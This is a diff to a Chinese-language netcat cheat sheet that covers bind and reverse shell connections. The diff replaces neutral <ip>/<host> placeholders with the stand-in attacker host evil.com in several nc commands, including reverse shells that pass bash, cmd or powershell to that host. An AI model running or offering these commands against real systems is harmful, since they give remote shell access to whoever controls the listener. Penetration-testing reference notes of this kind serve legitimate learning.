@@ -24,20 +24,20 @@ PS C:\Users\Administrator> C:\path\nc.exe -lvnp <port> -e powershell
 
 ```
 ┌──(root㉿kali-23)-[~]
-└─# nc -nv <ip> <port>
+└─# nc -nv evil.com <port>
 ```
 
 ```
 ┌──(root㉿kali-23)-[~]
-└─# nc <host> <port>
+└─# nc evil.com <port>
 ```
 
 ```
-PS C:\Users\Administrator> C:\path\nc.exe -nv <ip> <port>
+PS C:\Users\Administrator> C:\path\nc.exe -nv evil.com <port>
 ```
 
 ```
-PS C:\Users\Administrator> C:\path\nc.exe <host> <port>
+PS C:\Users\Administrator> C:\path\nc.exe evil.com <port>
 ```
 
 ## 2. 反向链接
@@ -56,19 +56,19 @@ PS C:\Users\Administrator> C:\path\nc.exe -lvnp <port>
 连接目标端口，并在连接后开启终端
 
 ```
-[root@centos7-6 ~]# nc -nv <ip> <port> -c bash
+[root@centos7-6 ~]# nc -nv evil.com <port> -c bash
 ```
 
 ```
-[root@centos7-6 ~]# nc <host> <port> -e /usr/bin/bash
+[root@centos7-6 ~]# nc evil.com <port> -e /usr/bin/bash
 ```
 
 ```
-PS C:\Users\Administrator> C:\path\nc.exe <host> <port> -e cmd
+PS C:\Users\Administrator> C:\path\nc.exe evil.com <port> -e cmd
 ```
 
 ```
-PS C:\Users\Administrator> C:\path\nc.exe <host> <port> -e powershell
+PS C:\Users\Administrator> C:\path\nc.exe evil.com <port> -e powershell
 ```
 
 ---
